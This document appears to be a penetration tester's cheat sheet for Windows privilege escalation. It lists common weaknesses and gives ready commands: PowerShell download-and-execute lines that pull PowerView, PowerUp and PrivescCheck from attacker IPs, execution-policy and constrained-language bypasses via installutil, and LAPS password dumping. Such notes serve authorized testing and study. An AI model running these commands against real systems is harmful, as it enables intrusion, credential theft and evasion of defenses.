# Windows PrivEsc
There are various ways of locally escalating privileges on a Windows box:

– Missing patches (PrintNightmare/Hivenightmare)

– Automated deployment, AutoLogon passwords, passwords in files in clear text

– AlwaysInstallElevated (Any user can run MSI as SYSTEM)

– Misconfigured Services

– DLL Hijacking and more

– NTLM Relaying a.k.a. Won't Fix

First run powerview to get an understanding on machine you are on and the role it plays.
```
(new-object system.net.webclient).downloadstring('http://10.10.16.161/PowerView.ps1') | IEX
```
Check for ms-mcs-admpwd

Check for Passwordless logins
```
get-NetUser -domain DEV.ADMIN.OFFSHORE.COM | Where-Object { $_.userAccountControl -band 0x20 } | Select-Object samaccountname,userAccountControl
```

# LAPSToolkit
Get-LAPSComputers method from LAPSToolkit to list all computers that are set up with LAPS and display the hostname, the clear text password, and the expiration time:

```
PS C:\Tools> Import-Module .\LAPSToolkit.ps1

PS C:\Tools> Get-LAPSComputers
```

Execution policy issues.
```
powershell -ExecutionPolicy Bypass -File script.ps1
```
```
Set-ExecutionPolicy -ExecutionPolicy Unrestricted
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```
# Contrained Langauge Bypass. 
Use installutil to bypass .exe restrictions. 
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /logtoconsole=false /U C:\users\Public\bypass-clm.exe
```
# Seatbelt.exe 
```
Seatbelt.exe -group=all -full
```
https://github.com/GhostPack/Seatbelt

# PowerUp.ps1
```
(new-object system.net.webclient).downloadstring('http://192.168.49.77/PowerUp.ps1') | IEX
```
```
Invoke-AllChecks
```
# Enumerate Files For Passwords
- .txt
- .ps1
- config (not just .config but any file that has to do with the application/service it is running)

# WinPeas.exe

# PrivEscCheck
```
(new-object system.net.webclient).downloadstring('http://192.168.45.233/PrivescCheck.ps1') | IEX
```
```
Invoke-PrivescCheck -Extended
```

